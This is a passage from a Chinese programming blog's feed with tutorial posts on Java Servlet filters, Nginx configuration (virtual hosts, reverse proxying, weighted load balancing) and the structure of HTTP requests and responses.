alt="request继承体系"></li><li>HttpServletRequest实例，即上述代码中的req对象，是由tomcat自动实现<code>HttpServletRequest</code>接口的实例，该实例的<code>.java文件</code>存在<code>org.apache.catalina.connector.RequestFacade</code>包中</li><li>通过该对象，可以实现操作http协议中的请求消息，完成对应的需求</li><li>最常见的需求就是<code>请求转发</code></li></ul><p><br/></p><p>✅HttpServletResponse实例</p><ul><li>与HttpServletRequest实例类似，也是有tomcat自动创建的</li><li>通过该对象，可以实现操作http协议中的响应消息，完成对应的需求</li><li>最常见的需求就是<code>重定向</code></li></ul><p><br/></p><p>✅请求转发与重定向的区别</p><ul><li>重定向的特点<ul><li>地址栏发生变化</li><li>重定向可以访问其他站点(服务器)的资源</li><li>重定向是两次请求。不能使用request对象来共享数据</li></ul></li><li>转发的特点<ul><li>转发地址栏路径不变</li><li>转发只能访问当前服务器下的资源</li><li>转发是一次请求，可以使用request对象来共享数据</li></ul></li></ul><p><br/></p><h3 id="⭐Filter"><a href="#⭐Filter" class="headerlink" title="⭐Filter"></a>⭐Filter</h3><h4 id="🥝概述-2"><a href="#🥝概述-2" class="headerlink" title="🥝概述"></a>🥝概述</h4><ul><li>当访问服务器的资源时，过滤器可以将请求拦截下来，完成一些特殊的功能。</li><li>作用：一般用于完成通用的操作。如：登录验证、统一编码处理、敏感字符过滤等等</li></ul><p><br/></p><h4 id="🥝生命周期"><a href="#🥝生命周期" class="headerlink" title="🥝生命周期"></a>🥝生命周期</h4><ul><li><p>Filter接口    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig var1)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest var1, ServletResponse var2, FilterChain var3)</span> <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>init</p><ul><li>在服务器启动后，会创建Filter对象，然后调用init方法。只执行一次。用于加载资源</li></ul></li><li><p>doFilter</p><ul><li>每一次请求被拦截资源时，会执行。执行多次</li></ul></li><li><p>destroy</p><ul><li>​    在服务器关闭后，Filter对象被销毁。如果服务器是正常关闭，则会执行destroy方法。只执行一次。用于释放资源</li></ul></li><li><p>需要注意的是，doFilter()拦截的参数也是<code>ServletRequest</code>，如果web服务器为tomcat，该对象是tomcat生成</p></li></ul><p><br/></p><h4 id="🥝简单的执行过程"><a href="#🥝简单的执行过程" class="headerlink" title="🥝简单的执行过程"></a>🥝简单的执行过程</h4><ul><li>总的来说过滤器总的来说有两部分<ul><li>怎么访问资源的，一般都是通过URL或者URI与请求方式来解析</li><li>访问什么资源</li></ul></li><li>由以上两步可以做出以下的权限控制<ul><li>拦截前，指定需要拦截的资源<ul><li>可以使用通配符来表示，拦截的目录，拦截指定后缀名的文件等等</li></ul></li><li>拦截后，请求的处理<ul><li>如转发等等</li></ul></li></ul></li></ul><p><br/></p><h4 id="🥝过滤器链"><a href="#🥝过滤器链" class="headerlink" title="🥝过滤器链"></a>🥝过滤器链</h4><ul><li>如果有两个过滤器，过滤器1和过滤器2，执行顺序如下 <ul><li><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LRA[过滤器1] --&gt;B(过滤器2)    B --&gt; C{资源}    C --&gt;D(过滤器2)    D --&gt;E[过滤器1]  </pre></div>  </li></ul></li></ul><ul><li>过滤器先后顺序<ul><li>注解配置的过滤器<ul><li>按照类名的字符串比较规则比较，值小的先执行</li><li>如： AFilter 和 BFilter，AFilter就先执行了。</li></ul></li><li>web.xml配置的过滤器<ul><li>同一级标签内谁定义在上边，谁先执行</li></ul></li></ul></li></ul><p><br/></p><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://baike.baidu.com/item/servlet/477555?fr=aladdin">servlet - 百度百科</a></li><li><a href="https://zh.wikipedia.org/wiki/Apache_Tomcat">Apache Tomcat - 维基百科</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐Servlet&quot;&gt;&lt;a href=&quot;#⭐Servlet&quot; class=&quot;headerlink&quot; title=&quot;⭐Servlet&quot;&gt;&lt;/a&gt;⭐Servlet&lt;/h3&gt;&lt;h4 id=&quot;🥝概述&quot;&gt;&lt;a href=&quot;#🥝概述&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java组件" scheme="https://baicai.icu/tags/Java%E7%BB%84%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Nginx入门</title>
    <link href="https://baicai.icu/posts/fbf9d696.html"/>
    <id>https://baicai.icu/posts/fbf9d696.html</id>
    <published>2022-02-27T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐概述"><a href="#⭐概述" class="headerlink" title="⭐概述"></a>⭐概述</h3><ul><li>Nginx 是一款高性能的 http 服务器/反向代理服务器及电子邮件代理服务器，官方测试 nginx 能够支支撑 5 万并发链接，并且 cpu、内存等资源消耗却非常低，运行非常稳定</li></ul><p><br/></p><h3 id="⭐Nginx-应用场景"><a href="#⭐Nginx-应用场景" class="headerlink" title="⭐Nginx 应用场景"></a>⭐Nginx 应用场景</h3><ul><li><p>http 服务器</p><ul><li>Nginx 是一个 http 服务可以独立提供 http 服务。可以做静态网页服务器</li></ul></li><li><p>虚拟主机</p><ul><li>可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。</li></ul></li><li><p>反向代理</p><ul><li>一般业务场景下，都是由Nginx负责接收各种HTTP请求，再反代给其他应用服务器，如tomcat。</li></ul></li><li><p>负载均衡</p><ul><li>当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用 nginx 做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况</li></ul></li><li><p><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/nging业务场景.jpg" alt="nging业务场景"></p></li></ul><p><br/></p><h3 id="⭐配置虚拟主机"><a href="#⭐配置虚拟主机" class="headerlink" title="⭐配置虚拟主机"></a>⭐配置虚拟主机</h3><ul><li><p>单个虚拟主机的nginx配置文件    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置文件中一个server的值代表一个虚拟主机，其中不同的虚拟主机的端口号不能一样，一个端口号代表一个虚拟主机</span></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;<span class="comment">#默认端口号</span></span><br><span class="line">        server_name  localhost;<span class="comment">#域名或者ip，localhost在Linux系统代表当前主机的ip</span></span><br><span class="line">           <span class="comment">#后面购买了域名可以将localhost改成域名  </span></span><br><span class="line"></span><br><span class="line">        location / &#123;<span class="comment">#location 代表此虚拟主机的默认访问地址， </span></span><br><span class="line"><span class="comment">#/代表的是默认地址，就是主机的ip地址</span></span><br><span class="line">                    <span class="comment">#如果需要修改，将/改成对应路径即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            root   html;<span class="comment">#root 代表默认访问资源的根目录</span></span><br><span class="line"><span class="comment">#此默认根目录录为html目录，该目录在Nginx文件夹下</span></span><br><span class="line">                    <span class="comment">#如果需要修改，将文件夹复制到Nginx文件夹，将html改成文件夹名称</span></span><br><span class="line"></span><br><span class="line">            index  index.html index.htm;<span class="comment">#index代表默认首页</span></span><br><span class="line">                  <span class="comment">#此默认首页为index.html或者index.htm</span></span><br><span class="line"><span class="comment">#如果需要修改，改成对面的页面即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        error_page   500 502 503 504  /50x.html;<span class="comment">#错误页面</span></span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以将上述的配置文件的server{…}复制多个，将里面的端口号也改成多个，这样就能达到同一个主机中有多个虚拟主机</p></li><li><p>虚拟主机可以指向域名，当域名被解析出ip地址后，就能通过域名访问Nginx的虚拟主机</p></li></ul><p><br/></p><h3 id="⭐反向代理"><a href="#⭐反向代理" class="headerlink" title="⭐反向代理"></a>⭐反向代理</h3><p>✅正向代理</p><ul><li>正向代理一般也叫代理，广义上的局域网，可以将国内看做一个局域网，平常说的翻墙就是国内对国外的防火墙，如果想访问谷歌，就需要一个代理服务器将请求转发到谷歌，这个服务器就是VPN代理，这个过程称为正向代理。</li><li>正向代理，代理的是客户端。客户端是知道目标的，而目标是不知道客户端是通过VPN访问的。</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/正向代理示意图.jpg" alt="正向代理示意图"></li></ul><p><br/></p><p>✅反向代理</p><ul><li>如果访问国内的资源，也就是没有防火墙的存在，创建一个代理服务器，将国内的请求分发到国内不同区域的服务器，这个过程称为反向代理，</li><li>反向代理，代理的是服务器端。这一个过程对于客户端而言是透明的。</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/反向代理示意图.jpg" alt="反向代理示意图"></li></ul><p><br/></p><p>✅配置反向代理</p><ul><li><p><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/nginx跳转流程-16497782701046-16497782750197.jpg" alt="nginx跳转流程"></p></li><li><p>配置文件</p><ul><li><p>server中的参数<code>server_name</code>，参数值可以为域名或者ip+端口</p></li><li><p>当找到虚拟主机时，会进入server中的location</p><ul><li><p>location的参数root代表本机的根目录，参数值可以为nginx目录下所有的文件夹名字</p></li><li><p>location的参数proxy_pass代表跳转目录，跳其他主机的域名或者ip+端口，参数值需要在server外部定义</p></li></ul></li><li><p>upstream tomcat-travel</p><ul><li>其中<code>tomcat-travel</code>名称是任意的，但是需要跟proxy_pass的值相对应，即<a href="http://后面那部分">http://后面那部分</a></li><li>index.html index.htm代表跳后需要打开的默认资源，即转发到其他主机后，需要打开的是跳转的主机的默认资源，默认资源修改为跳转主机的其他资源</li></ul></li></ul></li></ul><p><br/></p><h3 id="⭐负载均衡"><a href="#⭐负载均衡" class="headerlink" title="⭐负载均衡"></a>⭐负载均衡</h3><ul><li><p>默认权重是1    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在跳转参数表中添加多个跳转路径，默认选中跳转路径的几率是相等的</span></span><br><span class="line">upstream tomcat-travel&#123;</span><br><span class="line">    server 192.168.11.128:8080;</span><br><span class="line">server 192.168.11.128:8081;</span><br><span class="line">server 192.168.11.128:8082;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>增加权重    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果在跳转路径增加参数weight，即可增加该跳转路径的权重</span></span><br><span class="line">upstream tomcat-travel&#123;</span><br><span class="line">    server 192.168.11.128:8080;</span><br><span class="line">server 192.168.11.128:8081 weight=2;<span class="comment">#上面是1，下面是1，中间是2，一共4等份，该路径占2份，所以跳转的概率是50%</span></span><br><span class="line">server 192.168.11.128:8082;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br/></p><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/34943332">8分钟带你深入浅出搞懂Nginx - 地球的外星人君</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐概述&quot;&gt;&lt;a href=&quot;#⭐概述&quot; class=&quot;headerlink&quot; title=&quot;⭐概述&quot;&gt;&lt;/a&gt;⭐概述&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Nginx 是一款高性能的 http 服务器/反向代理服务器及电子邮件代理服务器，官方测试 nginx 能够支支撑 5 </summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="中间件" scheme="https://baicai.icu/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>研究一下HTTP协议</title>
    <link href="https://baicai.icu/posts/a3a8aa53.html"/>
    <id>https://baicai.icu/posts/a3a8aa53.html</id>
    <published>2022-02-26T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐概述"><a href="#⭐概述" class="headerlink" title="⭐概述"></a>⭐概述</h3><ul><li><code>全称</code>：超文本传输协议（Hyper Text Transfer Protocol）</li><li><code>网络协议的定位</code>：基于TCP/IP的应用层协议（<a href="#wlxy">网络协议层级图</a>）</li><li><code>作用</code>：定义了客户端和服务器端通信时的格式，不涉及数据包传输</li><li><code>端口</code>：默认使用80端口</li></ul><p><br/></p><h3 id="⭐与TCP-IP协议的区别"><a href="#⭐与TCP-IP协议的区别" class="headerlink" title="⭐与TCP/IP协议的区别"></a>⭐与TCP/IP协议的区别</h3><ul><li>TCP/IP是传输层协议，主要解决数据如何在网络中传输（搬运）</li><li>而HTTP是应用层协议，主要解决如何包装数据（装配）。</li><li><p>我们在传输数据时，可以只使用（传输层）TCP/IP协议。但是那样的话，如果没有应用层，便无法识别数据内容，如果想要使传输的数据有意义，则必须使用到应用层协议，应用层协议有很多，比如HTTP、FTP、TELNET等，也可以自己定义应用层协议。</p></li><li><p>所以web应用通常使用http协议做应用层协议，以封装http文本信息，然后使用TCP/IP做传输层协议，将其发到网络上。</p></li></ul><p><br/></p><h3 id="⭐特点"><a href="#⭐特点" class="headerlink" title="⭐特点"></a>⭐特点</h3><ul><li>通讯模型<ul><li>基于请求/响应模型的：一次请求对应一次响应</li></ul></li><li>一次完整的通讯过程<ul><li><code>客户端</code>通过将数据封装在<code>请求消息</code>中，发送给<code>服务器端</code>。这个过程的意义是因为<code>客户端</code>需要获取<code>服务器端</code>的资源或者数据</li><li><code>服务器端</code>接收<code>请求消息</code>并处理，处理完毕后将数据封装在<code>响应消息</code>中，返回给<code>客户端</code>。这个过程的意义<code>服务器端</code>完成了<code>客户端</code>的需求</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/一次http通讯过程.png" alt="一次http通讯过程"></li></ul></li><li>无状态<ul><li>无状态是指协议对于事务处理没有记忆能力。</li><li>细化到每次客户端请求服务器之间相互独立，即上下两次请求不能交互数据</li></ul></li><li><p>数据格式</p><ul><li><p>为了实现客户端与服务端统一编码格式，HTTP协议规定了以下规范</p><ol><li><code>请求消息</code>和<code>响应消息</code>的<code>头部信息</code>（即请求头和请求行，响应头和响应行），统一采用<code>ASCII</code>编码方式。</li><li><code>消息具体内容</code>（即请求体，响应体），统一采用类似于<a href="#mime">MIME</a>的格式。</li></ol></li><li>对于浏览器发送的请求，浏览器会对他们进行自动编码，所以URL地址的中文路径会出现一堆数字与符合的字符串，这是因为中文被编译成了ASCII码。</li><li>而对于通过<code>javascript</code>的ajax发送的请求，需要通过js的方法手工编码。</li><li>如果使用未编码的中文URL，服务器就可能读取数据失败从而请求失败。</li></ul></li></ul><p><br/></p><h3 id="⭐历史版本"><a href="#⭐历史版本" class="headerlink" title="⭐历史版本"></a>⭐历史版本</h3><p>🥝HTTP/0.9</p><ul><li>该版本极其简单，只有一个命令<code>GET</code></li><li>协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。</li></ul><p><br/></p><p>🥝HTTP/1.0</p><ol><li><p>首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。</p></li><li><p>其次，除了<code>GET</code>命令，还引入了<code>POST</code>命令和<code>HEAD</code>命令，丰富了浏览器与服务器的互动手段。</p></li><li><p>再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。</p></li><li><p>其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等。</p></li><li><p><strong>缺点</strong></p></li></ol><ul><li><p>HTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，<strong>如果还要请求其他资源，就必须再新建一个连接</strong>。</p></li><li><p>TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（slow start）。所以，HTTP 1.0版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。</p></li><li><p>为了解决这个问题，有些浏览器在请求时，用了一个非标准的<code>Connection</code>字段。这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。</p></li></ul><p><br/></p><p>🥝HTTP/1.1</p><ul><li>1997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。</li><li>1.1 版的最大变化，就是引入了持久连接（persistent connection），即<strong>TCP连接默认不关闭</strong>，可以被<strong>多个请求复用</strong>，不用声明<code>Connection</code>字段了。</li><li>客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li><li>目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。</li></ul><p><br/></p><p>🥝HTTP/2.0</p><ul><li>新的二进制格式（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，<strong>二进制则不同，只认0和1的组合</strong>。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。</li><li>多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。</li><li>header压缩，如上文中所言，对前面提到过HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。</li><li>服务端推送（server push），同SPDY一样，HTTP2.0也具有server push功能。</li><li>HTTP2.0 目前还没有被广泛应用，阿里系的淘宝，天猫已经开始使用HTTP2.0。<ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/天猫使用http2.0版本.png" alt="天猫使用http2.0版本"></li></ul></li></ul><p><br/></p><h3 id="⭐请求消息"><a href="#⭐请求消息" class="headerlink" title="⭐请求消息"></a>⭐请求消息</h3><p>🥝概述</p><ul><li>客户端发送给服务器端的数据</li><li>一共分为四部分<ul><li>请求行</li><li>请求头</li><li>空行</li><li>请求体</li></ul></li></ul><p><br/></p><p>🥝示例</p><ol><li>浏览器解析请求消息的格式</li></ol><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/请求消息实例.png" alt="请求消息实例"></li></ul><ol><li><p>使用抓包工具抓取的http请求消息的数据如下    </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /login.htmlHTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/login.html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">username=zhangsan</span><br></pre></td></tr></table></figure></li></ol><p><br/></p><p>🥝请求行</p><ol><li><p>格式：<code>请求方式</code> + <code>请求url</code> + <code>请求协议/版本</code></p><ul><li>例：<code>POST /login.html HTTP/1.1</code></li></ul></li><li><p>请求方式</p><ul><li><p>HTTP协议有7中请求方式</p><ul><li>GET： 请求获取Request-URI所标识的资源</li><li>POST： 在Request-URI所标识的资源后增加新的数据</li><li>HEAD： 请求获取由Request-URI所标识的资源的响应消息报头</li><li>PUT： 请求服务器存储或修改一个资源，并用Request-URI作为其标识</li><li>DELETE： 请求服务器删除Request-URI所标识的资源</li><li>TRACE： 请求服务器回送收到的请求信息，主要用于测试或诊断</li><li>CONNECT： 保留将来使用</li><li>OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求</li></ul></li><li><p>在前后端分离的项目中，通常使用<a href="#Restful">Restful</a>风格来设计API，实际上就是通过不同的请求方式来语义化操作数据</p></li><li>最常用的一般都是 GET 和 POST</li></ul></li><li><p>GET</p><ul><li><p>请求参数在<strong>请求行</strong>中，即url后面</p></li><li><p>请求的url长度有限制的</p></li><li><p>除了form表单大多数是get请求，例如请求各种资源等</p></li></ul></li><li><p>POST</p><ul><li><p>请求参数在<strong>请求体</strong>中</p></li><li><p>请求的url长度没有限制的</p></li><li><p>表单可以选择post请求</p></li><li><p>所以post相对于get是<strong>相对</strong>安全，因为两者的数据都是http传输中，安全的区别在于数据存放的位置</p></li></ul></li></ol><p><br/></p><p>🥝请求头</p><ol><li><p>作用</p><ul><li>客户端浏览器告诉服务器一些信息</li></ul></li><li><p>数据格式</p><ul><li>一般都是<code>键:值</code>的形式出现</li></ul></li><li><p>常见的请求头</p><ul><li><p><strong><em>User-Agent</em></strong></p><ul><li>例：<code>User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0</code></li><li>作用：浏览器告诉服务器，使用的浏览器版本信息。利用这一点服务器根据可以不同浏览器，解决一些浏览器的兼容性问题</li></ul></li><li><p><strong><em>Referer</em></strong></p><ul><li>例：<code>http://localhost/login.html</code></li><li>作用：<ul><li>告诉服务器，请求端从哪里来的，利用这一点，可以做以下的功能</li><li>防盗链（可以判断当前请求是否来自对应的网站）</li><li>统计工作（统计不同请求端的数据）</li></ul></li></ul></li><li><strong><em>Authorization</em></strong><ul><li>例：<code>Authorization:37c6160600434bc999c1fb2be8c9a169</code></li><li>作用：如果服务器想做<strong>认证与权限</strong>的处理，由于http无状态原因不能识别出哪些请求是属于同一个来访者，所以需要在请求消息中加入此请求头。此后服务器就能从此请求头来匹配请求与来访者的关系，从而达到权限权限处理。</li></ul></li><li><strong><em>Content-Type</em></strong><ul><li>作用：客户器告诉服务端本次请求体数据格式以及编码格式</li><li>需要注意的是，由于只有POST请求才会有请求体，所以POST请求才会携带此请求头</li></ul></li></ul></li></ol><p><br/></p><p>🥝请求空行</p><ul><li>空出一行，服务器通过该空行解析出请求消息的<code>请求头</code>和<code>请求体</code></li></ul><p><br/></p><p>🥝请求体</p><ul><li>封装POST请求消息的请求参数</li><li>GET请求没有请求体</li></ul><p><br/></p><h3 id="⭐响应消息"><a href="#⭐响应消息" class="headerlink" title="⭐响应消息"></a>⭐响应消息</h3><p>🥝概述</p><ul><li>服务器端发送给客户端的数据</li><li>一共分为四部分<ul><li>响应行</li><li>响应头</li><li>空行</li><li>响应体</li></ul></li></ul><p><br/></p><p>🥝示例</p><ol><li><p>浏览器解析响应消息的格式</p><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/响应消息之浏览器解析.png" alt="响应消息之浏览器解析"></li></ul></li><li><p>使用抓包工具抓取的http响应消息的数据如下    </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 06 Jun 2018 07:08:42 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">hello,Security</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><p><br/></p><p>🥝响应行</p><ul><li>格式：<code>协议/版本</code>  + <code>响应状态码</code> + <code>状态码描述</code><ul><li>例：<code>HTTP/1.1 200 OK</code></li></ul></li><li>响应状态码：服务器告诉客户端浏览器本次请求和响应的一个状态<ul><li>状态码都是3位数字 </li><li>分类<ul><li>1xx：服务器就收客户端消息，但没有接受完成，等待一段时间后，发送1xx多状态码</li><li>2xx：成功。代表：200</li><li>3xx：<strong>重定向</strong>。代表：302(重定向)，304(访问缓存)</li><li>4xx：客户端错误。<ul><li>400：客户端请求格式错误</li><li>404：请求路径没有对应的资源</li><li>405：请求方式没有对应的doXxx方法</li></ul></li><li>5xx：服务器端错误。<ul><li>500：服务器理解了请求，但是服务器内部处理的出现异常</li></ul></li></ul></li></ul></li></ul><p><br/></p><p>🥝响应头</p><ul><li><p>一般都是<code>键:值</code>的形式出现</p></li><li><p>常见的请求头的值</p><ul><li><strong><em>Content-Type</em></strong><ul><li>作用：服务器告诉客户端本次响应体数据格式以及编码格式</li></ul></li><li><strong><em>Content-disposition</em></strong><ul><li>作用：服务器告诉客户端以什么格式打开响应体数据</li><li><code>in-line</code>：默认值，表示在当前页面内打开</li><li><code>attachment;filename=xxx</code>：表示以附件形式打开响应体。可以用来做文件下载功能</li></ul></li></ul></li></ul><p><br/></p><p>🥝响应空行</p><ul><li>空出一行，服务器通过该空行解析出响应消息的<code>响应头</code>和<code>响应体</code></li></ul><p><br/></p><p>🥝响应体</p><ul><li>传输的数据，包含照片或者其他文件以二进制形式进行数据传输等等</li></ul><p><br/></p><h3 id="⭐MIME类型"><a href="#⭐MIME类型" class="headerlink" title="⭐MIME类型"></a>⭐<span id="mime">MIME类型</span></h3><p>🥝概述</p><ul><li>在互联网通信过程中定义的一种文件数据类型</li><li>格式<ul><li>大类型/小类型，例：<code>text/html</code>，<code>image/jpeg</code></li></ul></li><li>在HTTP中应用<ul><li>由于互联网的文件类型非常多，而消息头只负责通讯，消息内容才是需要传递的数据，所以需要一种标准来描述消息内容的数据格式</li><li>在HTTP协议中，通过设置<code>请求头或者响应头</code>的<code>Content-Type</code>，从而指定了此次<code>请求体</code>或者<code>响应体</code>的数据格式，这样接收方就能使用指定的MIME-type 